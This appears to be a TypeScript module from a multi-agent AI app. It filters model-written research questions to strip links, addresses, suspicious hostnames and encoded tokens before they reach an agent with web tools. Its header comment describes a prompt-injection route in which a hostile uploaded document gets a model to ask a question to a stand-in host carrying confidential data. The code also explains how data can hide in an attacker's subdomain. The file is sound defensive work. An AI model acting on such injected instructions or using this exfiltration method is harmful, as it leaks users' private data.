/**
 * What may leave this machine as a research question (docs/SECURITY-AUDIT-2.md
 * finding 2).
 *
 * Every research question is model-written, by a seat that has read the
 * founder's uploaded material (the architect, the chair, an expert's RESEARCH
 * trailer). A hostile document only has to get one of them to ask "look up
 * https://x.example/?q=<the margin floor>", and the question goes to a seat
 * with web tools. So before a question reaches the desk it must look like a
 * question: no links, no addresses, no opaque tokens that could carry data,
 * and short. The fetch rule (sdk.ts) is the wall behind this one.
 *
 * Pure, no I/O.
 */

export const QUESTION_MAX = 300;

/**
 * A written link: a scheme URL, a www. address, or a host followed by a path.
 * A bare host name with no path is judged on its own (HOST, below).
 */
const LINK = /\b[a-z][a-z0-9+.-]*:\/\/\S+|\bwww\.\S+|\b[a-z0-9-]+(?:\.[a-z0-9-]+)*\.[a-z]{2,}\/\S*/gi;
/**
 * A bare host name of three labels or more ("docs.python.org"), the last label
 * carrying a letter so version numbers ("1.2.3") are not hosts.
 */
const HOST = /\b[a-z0-9-]+(?:\.[a-z0-9-]+)+\.[a-z0-9-]*[a-z][a-z0-9-]*\b/gi;
/** A written IPv4 address. */
const IPV4 = /\b\d{1,3}(?:\.\d{1,3}){3}\b/g;
/** A written IPv6 address: hex groups and colons, with "::" or at least five colons ("10:30:00" is a time). */
const IPV6 = /\[?(?<![\w:])[0-9a-f]{0,4}(?::[0-9a-f]{0,4}){2,7}(?![\w:])\]?/gi;
const isIpv6 = (t: string) => /\d/.test(t) && (t.includes('::') || (t.match(/:/g)?.length ?? 0) >= 5);
/**
 * Names that never reach the public internet: this machine, a home or office
 * network, and the reserved names (RFC 2606, RFC 6761, RFC 8375).
 */
const PRIVATE_TLD = new Set(['localhost', 'local', 'localdomain', 'internal', 'intranet', 'lan', 'home', 'corp', 'private', 'arpa', 'example', 'invalid', 'test', 'onion']);

/**
 * Whether a bare host of three labels or more reads as an ordinary public
 * site ("docs.python.org", "data.gov.uk", "ec.europa.eu"): a public top-level
 * name, at most five labels, each label short and word-like. A label with a
 * run of three digits, or letters and digits that alternate ("m41f", "q2x9"),
 * is refused: that is how data rides in a subdomain of an attacker's own
 * domain. What still fits through is a few word-like characters, and the
 * research desk only searches with the question; it opens nothing but pages a
 * search returned (research/pages.ts), so naming a host contacts no one.
 */
export function publicHost(host: string): boolean {
  const labels = host.toLowerCase().split('.');
  const tld = labels[labels.length - 1];
  if (labels.length > 5 || !/^[a-z]{2,24}$/.test(tld) || PRIVATE_TLD.has(tld)) return false;
  return labels.every((l) =>
    l.length >= 1 && l.length <= 24 && !l.startsWith('-') && !l.endsWith('-') &&
    !/\d{3,}/.test(l) && (l.match(/[a-z](?=\d)|\d(?=[a-z])/g)?.length ?? 0) < 2);
}

/** "U.S.A." and "e.g." are abbreviations, not hosts. */
const abbreviation = (h: string) => h.split('.').every((l) => l.length === 1);
const badHost = (h: string) => !abbreviation(h) && !publicHost(h);
const EMAIL = /\b[^\s@]+@[^\s@]+\.[a-z]{2,}\b/gi;
/**
 * Something that reads as encoded data rather than words: 24+ characters with
 * no space, carrying a digit or one of + / = _ %. A long ordinary word
 * ("internationalisation") passes; base64, hex and URL-encoding do not.
 */
const TOKEN = /[A-Za-z0-9+/=_%-]{24,}/g;
const looksEncoded = (t: string) => /[0-9+/=_%]/.test(t);

function why(text: string): string | null {
  if (new RegExp(LINK.source, 'i').test(text)) return 'it contains a link';
  if (new RegExp(EMAIL.source, 'i').test(text)) return 'it contains an email address';
  if (new RegExp(IPV4.source).test(text) || [...text.matchAll(IPV6)].some((m) => isIpv6(m[0]))) return 'it contains a network address';
  for (const m of text.matchAll(HOST)) if (badHost(m[0])) return 'it contains a link';
  for (const m of text.matchAll(TOKEN)) if (looksEncoded(m[0])) return 'it contains a long encoded string';
  return null;
}

/** The question as it may go out, trimmed to QUESTION_MAX at a word; or why it may not. */
export function gateQuestion(raw: string): { ok: true; question: string } | { ok: false; reason: string } {
  const q = raw.replace(/\s+/g, ' ').trim();
  const bad = why(q);
  if (bad) return { ok: false, reason: bad };
  if (q.length <= QUESTION_MAX) return { ok: true, question: q };
  const cut = q.slice(0, QUESTION_MAX);
  const at = cut.lastIndexOf(' ');
  return { ok: true, question: (at > QUESTION_MAX * 0.6 ? cut.slice(0, at) : cut).trim() };
}

/** Any text that rides along with a research question (the panel's goal): links, addresses and tokens removed. */
export function scrubForWeb(text: string, max = 600): string {
  return text
    .replace(LINK, '[link removed]')
    .replace(EMAIL, '[address removed]')
    .replace(IPV4, '[address removed]')
    .replace(IPV6, (t) => (isIpv6(t) ? '[address removed]' : t))
    .replace(HOST, (h) => (badHost(h) ? '[link removed]' : h))
    .replace(TOKEN, (t) => (looksEncoded(t) ? '[removed]' : t))
    .slice(0, max);
}
